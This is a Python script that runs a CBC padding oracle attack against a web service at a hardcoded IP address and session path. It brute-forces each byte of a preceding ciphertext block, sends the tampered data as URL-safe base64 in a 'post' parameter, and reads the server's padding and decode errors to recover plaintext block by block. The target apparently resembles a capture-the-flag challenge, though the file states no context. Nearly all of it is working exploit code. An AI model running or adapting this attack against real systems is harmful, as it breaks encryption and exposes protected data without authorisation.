
#encoding:utf8
import sys
import threading
import time

import requests
import base64
from enum import Enum
import copy
import binascii as BA
import globalvar
import functools
from utils.LOGGER import LOGGER
from os import popen


class MSG(object):
    ERROR_PADDING = 'Incorrect padding'
    EXP_PADDING = 'PaddingException'
    ERROR_DECODE = 'UnicodeDecodeError:'
    ERROR_VALUE = 'ValueError:'


class STATUS(Enum):
    ST_NOT_FOUND = 1
    ST_FOUND = 2


class Worker(object):
    def __init__(self, idx, data):
        self.urlFmt = 'http://{}/{}/?post={}'
        self.IP = '34.74.105.127'
        self.SESSION = '84693fb931'
        self.data = data
        self.idx = idx

        super(Worker, self).__init__()

    def SendRequest(self, data, proxy = False):
        LOGGER.debug('run in SendRequest')
        headers = {
            'Host': self.IP,
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 YaBrowser/20.3.0.2220 Yowser/2.5 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate, sdch',
            'Accept-Language': 'en,zh;q=0.9,fr;q=0.8',
        }

        if proxy:
            proxies = {
                'http': 'http://127.0.0.1:8080',
                'https': 'http://127.0.0.1:8080',
            }
        else:
            proxies = {}

        resp = requests.get(
            'http://{}/{}/?post={}'.format(self.IP, self.SESSION, data), headers=headers, proxies=proxies)
        cont = resp.content.decode('utf8')
        return cont

    @staticmethod
    def Process(data):
        LOGGER.debug('run in {}'.format(sys._getframe().f_code.co_name))
        return base64.encodestring(data).replace('=', '~').replace('/', '!').replace('+', '-')
    
    def run(self):
        _blocks = []
        for i in range(0, len(self.data), 16):
            _blocks.append(list(self.data[i: i+16]))

        if len(_blocks) <= 1:
            return

        _pre_block = _blocks[-2]
        _copy_blocks = copy.deepcopy(_blocks)
        __pre_block = copy.deepcopy(_pre_block)

        _mid_blocks = []

        # print(f'old:{BA.b2a_hex(self.data)}')
        _tmp_iv = []

        _thread_name = ''

        try:
            for _idx in range(-1, -17, -1):

                LOGGER.debug('here0')
                if threading.currentThread().name == _thread_name:
                    LOGGER.info('_tmp_iv: {}'.format(_tmp_iv))

                for __idx in range(-1, _idx, -1):
                    LOGGER.debug('{}/{}'.format(__idx, _idx))
                    __pre_block[__idx] = chr(abs(__idx) ^ _tmp_iv[__idx] ^ abs(_idx))

                LOGGER.debug('here1')
                for _enum_c in range(0, 256):
                    __pre_block[_idx] = chr(_enum_c)
                    _copy_blocks[-2] = __pre_block
                    _data = ''.join(''.join(_block) for _block in _copy_blocks)
                    
                    cont = self.SendRequest(self.Process(_data))
# 石伟
                    LOGGER.debug('data: {}, len: {}'.format(BA.b2a_hex(_data), len(_data)))
                    LOGGER.debug(cont)
                    if MSG.ERROR_PADDING in cont or MSG.EXP_PADDING in cont:
                        # LOGGER.warn('PADDING ERROR')
                        LOGGER.debug(cont)
                        continue

                    else:
                        if MSG.ERROR_DECODE in cont:
                            LOGGER.info('block: {:>4}, pos: {:>4}, padding: {}'.format(self.idx, _idx, _enum_c))
                            LOGGER.debug(cont)
                        elif 'test' in cont and '123456' in cont:
                            _thread_name = threading.currentThread().name
                            LOGGER.info("block: {:>4}, pos: {:>4}, GUESS PK5: {}".format(self.idx, _idx, abs(_idx)))
                            # print(cont)
                            if _data == self.data and _idx == -1:
                                continue

                        elif MSG.ERROR_VALUE in cont:
                            LOGGER.debug('data: {}, len: {}'.format(BA.b2a_hex(_data), len(_data)))
                            LOGGER.debug(cont)
                        else:
                            LOGGER.debug('here3')
                            LOGGER.debug('cont')
                            pass

                        _mid_c = _enum_c ^ abs(_idx)
                        _tmp_iv.insert(0, _enum_c)
                        _mid_blocks.insert(0, chr(_mid_c))
                        break

        except Exception as e:
            LOGGER.error(e)
            LOGGER.info("block: {:>4}, CONFIRM PK5: {}".format(self.idx, 0x10))
            _mid_blocks = None
            return None
        finally:
            if not _mid_blocks:
                globalvar.results[self.idx] = '\x10'*16
            else:
                
                globalvar.results[self.idx] = ''.join(map(lambda x: chr(ord(x[0]) ^ ord(x[1])), zip(_pre_block, _mid_blocks)))
                LOGGER.info('idx: {}, result: {}'.format(self.idx, globalvar.results[self.idx]))
                
            # LOGGER.info('{}, {}'.format(self.idx, _mid_blocks))

